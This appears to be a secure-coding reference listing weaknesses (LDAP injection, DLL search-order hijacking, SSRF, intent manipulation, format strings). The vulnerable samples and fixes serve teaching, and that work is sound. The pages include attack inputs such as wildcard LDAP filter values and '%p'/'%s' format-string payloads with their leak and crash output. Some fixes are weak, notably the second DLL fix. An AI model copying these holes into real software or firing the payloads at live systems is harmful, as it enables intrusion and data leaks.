            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1097">LDAP Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The Lightweight Directory Access Protocol (LDAP) allows an application to remotely perform operations such as searching and modifying records in directories.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>LDAP injection results from inadequate input sanitization and validation and allows malicious users to glean restricted information using the directory service.</p>
<p>An authentication routine that permitted LDAP injection would allow unauthorized users to log in. Likewise, a search routine would allow an attacker to discover part or all of the data in the directory.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>This vulnerable code example allows a caller of the method searchRecord() to search for a record in the directory using the LDAP protocol:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// String userSN = "S*"; // Invalid</span>
<span class="c1">// String userPassword = "*"; // Invalid</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LDAPInjection</span> <span class="o">{</span>       
  <span class="kd">private</span> <span class="kt">void</span> <span class="nf">searchRecord</span><span class="o">(</span><span class="n">String</span> <span class="n">userSN</span><span class="o">,</span> <span class="n">String</span> <span class="n">userPassword</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NamingException</span> <span class="o">{</span>        
    <span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span>  <span class="n">env</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;();</span>
    <span class="n">env</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="o">,</span> <span class="s">"com.sun.jndi.ldap.LdapCtxFactory"</span><span class="o">);</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">DirContext</span> <span class="n">dctx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialDirContext</span><span class="o">(</span><span class="n">env</span><span class="o">);</span>

      <span class="n">SearchControls</span> <span class="n">sc</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SearchControls</span><span class="o">();</span>
      <span class="n">String</span><span class="o">[]</span> <span class="n">attributeFilter</span> <span class="o">=</span> <span class="o">{</span><span class="s">"cn"</span><span class="o">,</span> <span class="s">"mail"</span><span class="o">};</span>
      <span class="n">sc</span><span class="o">.</span><span class="na">setReturningAttributes</span><span class="o">(</span><span class="n">attributeFilter</span><span class="o">);</span>
      <span class="n">sc</span><span class="o">.</span><span class="na">setSearchScope</span><span class="o">(</span><span class="n">SearchControls</span><span class="o">.</span><span class="na">SUBTREE_SCOPE</span><span class="o">);</span>
      <span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">"dc=example,dc=com"</span><span class="o">;</span>

      <span class="c1">// The following resolves to (&amp;(sn=S*)(userPassword=*))     </span>
      <span class="n">String</span> <span class="n">filter</span> <span class="o">=</span> <span class="s">"(&amp;(sn="</span> <span class="o">+</span> <span class="n">userSN</span> <span class="o">+</span> <span class="s">")(userPassword="</span> <span class="o">+</span> <span class="n">userPassword</span> <span class="o">+</span> <span class="s">"))"</span><span class="o">;</span>

      <span class="n">NamingEnumeration</span><span class="o">&lt;?&gt;</span> <span class="n">results</span> <span class="o">=</span> <span class="n">dctx</span><span class="o">.</span><span class="na">search</span><span class="o">(</span><span class="n">base</span><span class="o">,</span> <span class="n">filter</span><span class="o">,</span> <span class="n">sc</span><span class="o">);</span>
      <span class="k">while</span> <span class="o">(</span><span class="n">results</span><span class="o">.</span><span class="na">hasMore</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">SearchResult</span> <span class="n">sr</span> <span class="o">=</span> <span class="o">(</span><span class="n">SearchResult</span><span class="o">)</span> <span class="n">results</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
        <span class="n">Attributes</span> <span class="n">attrs</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attributes</span><span class="o">)</span> <span class="n">sr</span><span class="o">.</span><span class="na">getAttributes</span><span class="o">();</span>
        <span class="n">Attribute</span> <span class="n">attr</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attribute</span><span class="o">)</span> <span class="n">attrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"cn"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">attr</span><span class="o">);</span>
        <span class="n">attr</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attribute</span><span class="o">)</span> <span class="n">attrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"mail"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">attr</span><span class="o">);</span>
      <span class="o">}</span>    
      <span class="n">dctx</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Forward to handler</span>
    <span class="o">}</span>
  <span class="o">}</span> 
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>This compliant solution uses a whitelist to sanitize user input so that the filter string contains only valid characters. In this code, userSN may contain only letters and spaces, whereas a password may contain only alphanumeric characters:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// String userSN = "Sherlock Holmes"; // Valid</span>
<span class="c1">// String userPassword = "secret2";   // Valid</span>

<span class="c1">// ... beginning of LDAPInjection.searchRecord()...</span>
<span class="n">sc</span><span class="o">.</span><span class="na">setSearchScope</span><span class="o">(</span><span class="n">SearchControls</span><span class="o">.</span><span class="na">SUBTREE_SCOPE</span><span class="o">);</span>
<span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">"dc=example,dc=com"</span><span class="o">;</span>

<span class="k">if</span> <span class="o">(!</span><span class="n">userSN</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w\\s]*"</span><span class="o">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">userPassword</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w]*"</span><span class="o">))</span> <span class="o">{</span>
  <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">"Invalid input"</span><span class="o">);</span>
<span class="o">}</span>

<span class="n">String</span> <span class="n">filter</span> <span class="o">=</span> <span class="s">"(&amp;(sn = "</span> <span class="o">+</span> <span class="n">userSN</span> <span class="o">+</span> <span class="s">")(userPassword="</span> <span class="o">+</span> <span class="n">userPassword</span> <span class="o">+</span> <span class="s">"))"</span><span class="o">;</span>

<span class="c1">// ... remainder of LDAPInjection.searchRecord()...    </span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS54-J.+Prevent+LDAP+injection <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0089">Process Control</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 4 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example-1">Vulnerable code Example 1</a></li>
<li><a href="#fixed-code-example-1">Fixed code Example 1</a></li>
<li><a href="#vulnerable-code-example-2">Vulnerable code Example 2</a></li>
<li><a href="#fixed-code-example-2">Fixed code Example 2</a></li>
<li><a href="#vulnerable-code-example-3">Vulnerable code Example 3</a></li>
<li><a href="#fixed-code-example-3">Fixed code Example 3</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Process control vulnerabilities take two forms: </p>
<ol>
<li>An attacker can change the command that the program executes: the attacker explicitly controls what the command is. </li>
<li>An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means. </li>
</ol>
<p>Process control vulnerabilities of the first type occur when either data enters the application from an untrusted source and the data is used as part of a string representing a command that is executed by the application. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.  </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Execute Unauthorized Code or Commands</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Libraries that are loaded should be well understood and come from a trusted source. The application can execute code contained in the native libraries, which often contain calls that are susceptible to other security problems, such as buffer overflows or command injection. All native libraries should be validated to determine if the application requires the use of the library. It is very difficult to determine what these native libraries actually do, and the potential for malicious code is high. In addition, the potential for an inadvertent mistake in these native libraries is also high, as many are written in C or C++ and may be susceptible to buffer overflow or race condition problems. To help prevent buffer overflow attacks, validate all input to native calls for content and length. If the native library does not come from a trusted source, review the source code of the library. The library should be built from the reviewed source before using it. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example-1">Vulnerable code Example 1</h3>
<p>The following code uses System.loadLibrary() to load code from a native library named library.dll, which is normally found in a standard system directory.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">...</span>
<span class="n">System</span><span class="o">.</span><span class="na">loadLibrary</span><span class="o">(</span><span class="s">"library.dll"</span><span class="o">);</span>
<span class="o">...</span>
</pre></div>
</td></tr></table>
<p>The problem here is that System.loadLibrary() accepts a library name, not a path, for the library to be loaded. From the Java 1.4.2 API documentation this function behaves as follows [1]: A file containing native code is loaded from the local file system from a place where library files are conventionally obtained. The details of this process are implementation-dependent. The mapping from a library name to a specific filename is done in a system-specific manner. If an attacker is able to place a malicious copy of library.dll higher in the search order than file the application intends to load, then the application will load the malicious copy instead of the intended file. Because of the nature of the application, it runs with elevated privileges, which means the contents of the attacker's library.dll will now be run with elevated privileges, possibly giving them complete control of the system.</p>
<h3 id="fixed-code-example-1">Fixed code Example 1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">...</span>
<span class="c1">// Use absolute path</span>
<span class="n">System</span><span class="o">.</span><span class="na">loadLibrary</span><span class="o">(</span><span class="s">"C:\\path_to_real_lib\\library.dll"</span><span class="o">);</span>
<span class="o">...</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-2">Vulnerable code Example 2</h3>
<p>The following code from a privileged application uses a registry entry to determine the directory in which it is installed and loads a library file based on a relative path from the specified directory.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">...</span>
<span class="n">RegQueryValueEx</span><span class="p">(</span><span class="n">hkey</span><span class="p">,</span> <span class="s">"APPHOME"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">home</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
<span class="kt">char</span><span class="o">*</span> <span class="n">lib</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">home</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">INITLIB</span><span class="p">));</span>
<span class="k">if</span> <span class="p">(</span><span class="n">lib</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span><span class="n">home</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span><span class="n">INITCMD</span><span class="p">);</span>
  <span class="n">LoadLibrary</span><span class="p">(</span><span class="n">lib</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">...</span>
</pre></div>
</td></tr></table>
<p>The code in this example allows an attacker to load an arbitrary library, from which code will be executed with the elevated privilege of the application, by modifying a registry key to specify a different path containing a malicious version of INITLIB. Because the program does not validate the value read from the environment, if an attacker can control the value of APPHOME, they can fool the application into running malicious code.</p>
<h3 id="fixed-code-example-2">Fixed code Example 2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">...</span>

<span class="c1">// Ensure the safety of data before updating Reg</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_safe_key</span><span class="p">(</span><span class="n">hkey</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">is_safe</span><span class="p">(</span><span class="n">home</span><span class="p">))</span> <span class="p">{</span>
 <span class="n">error_handle</span><span class="p">(</span><span class="s">"Unsafe Reg editing"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">RegQueryValueEx</span><span class="p">(</span><span class="n">hkey</span><span class="p">,</span> <span class="s">"APPHOME"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">home</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
<span class="kt">char</span><span class="o">*</span> <span class="n">lib</span><span class="o">=</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">home</span><span class="p">)</span><span class="o">+</span><span class="n">strlen</span><span class="p">(</span><span class="n">INITLIB</span><span class="p">));</span>
<span class="k">if</span> <span class="p">(</span><span class="n">lib</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span><span class="n">home</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span><span class="n">INITCMD</span><span class="p">);</span>
  <span class="n">LoadLibrary</span><span class="p">(</span><span class="n">lib</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">...</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-3">Vulnerable code Example 3</h3>
<p>The following code is from a web-based administration utility that allows users access to an interface through which they can update their profile on the system. The utility makes use of a library named liberty.dll, which is normally found in a standard system directory.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"liberty.dll"</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<p>The problem is that the program does not specify an absolute path for liberty.dll. If an attacker is able to place a malicious library named liberty.dll higher in the search order than file the application intends to load, then the application will load the malicious copy instead of the intended file. Because of the nature of the application, it runs with elevated privileges, which means the contents of the attacker's liberty.dll will now be run with elevated privileges, possibly giving the attacker complete control of the system. The type of attack seen in this example is made possible because of the search order used by LoadLibrary() when an absolute path is not specified. If the current directory is searched before system directories, as was the case up until the most recent versions of Windows, then this type of attack becomes trivial if the attacker can execute the program locally. The search order is operating system version dependent, and is controlled on newer operating systems by the value of the registry key: HKLM\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</p>
<h3 id="fixed-code-example-3">Fixed code Example 3</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// Use absolute path</span>
<span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">path_to_real_lib</span><span class="se">\\</span><span class="s">liberty.dll"</span><span class="p">);</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/114.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-114.html">CWE-114</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1077">Server-Side Request Forgery</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly. The server can be used as a proxy to conduct port scanning of hosts in internal networks, use other URLs such as that can access documents on the system (using file://), or use other protocols such as gopher:// or tftp://, which may provide greater control over the contents of requests.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Implement a whiltelist of allowed domains and protocols for remote resource fetching.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/918.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1110">Intent Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software receives input from an upstream component, but it does not restrict or incorrectly restricts the input before it is used as an identifier for a resource that may be outside the intended sphere of control.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Attackers can exploit the vulnerabilities in Intent parameters so as to control the subsequent activities.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. </p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>The vulnerable code below uses user input directly from an HTTP request without first verifying it:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">...</span>
<span class="n">String</span> <span class="n">cName</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"className"</span><span class="o">);</span>
<span class="o">...</span>
<span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
<span class="o">...</span>
<span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="n">cName</span><span class="o">);</span>
<span class="n">someContext</span><span class="o">.</span><span class="na">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
<span class="o">...</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/99.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0085">Format String Vulnerability</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a><ul>
<li><a href="#dos-information-leak">DoS, Information leak</a></li>
</ul>
</li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example-1-leak-content-in-program-stack">Vulnerable code example 1: Leak content in program stack</a></li>
<li><a href="#vulnerable-code-example-2-denial-of-service-program-crash">Vulnerable code example 2: Denial of service, Program crash</a></li>
<li><a href="#fixed-code-example">Fixed code example</a></li>
<li><a href="#vulnerable-code-example-3">Vulnerable code example 3</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>String format related functions like <code>printf</code> in C and <code>String.format</code> in Java can take a varying number of arguments. One of the arguments describes the way to interpret the rest of arguments, and is called the format string argument. According to the implementation of the programming language, an external malicious format string may lead to program crash, information leak and code execution. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<h4 id="dos-information-leak">DoS, Information leak</h4>
<p>Formatting string functions will print out memory content according to integer specifiers, therefore, sensitive information inside memory could be leaked to attackers.
Attackers also could include multiple string specifiers to format string argument. It tells the program to interpret data as a pointer to a string, since memory data are not always valid pointers, program will crash in dereferencing an invalid pointer.  </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>Do not use externally-controlled data as format string argument</li>
<li>Sanitize user input before they used as format string argument</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example-1-leak-content-in-program-stack">Vulnerable code example 1: Leak content in program stack</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mh">0xAABBCCDD</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0xFFEE4242</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
  <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>Program execution: </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="highlight"><pre><span></span>$ ./a.out <span class="s2">"%p %p %p %p %p %p %p %p %p  "</span>
0x7ffeccbb42f8 0x7ffeccbb4310 <span class="o">(</span>nil<span class="o">)</span> 0x4005e0 0x7f287164bab0 <span class="se">\</span>
0x7ffeccbb42f8 0x200400430 0x7ffeccbb42f0 0xffee4242aabbccdd  
</pre></div>
</td></tr></table>
<p>The last output (0xffee4242aabbccdd) is the value of local variables <code>a</code> and <code>b</code> in our example. This example shows string formatting functions will read memory content based on the format string argument, and thus maliciously constructed input could leak sensitive information.</p>
<h3 id="vulnerable-code-example-2-denial-of-service-program-crash">Vulnerable code example 2: Denial of service, Program crash</h3>
<p>We use the same program from example 1, but with different input this time.  </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span>$ ./a.out <span class="s2">"%s %s %s %s %s %s %s %s %s  "</span>
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</pre></div>
</td></tr></table>
<p><code>%s</code> tells the program to use the corresponding argument as a pointer to string, and the program crashes when dereferencing an invalid pointer.</p>
<h3 id="fixed-code-example">Fixed code example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mh">0xAABBCCDD</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0xFFEE4242</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
  <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
<span class="p">}</span>
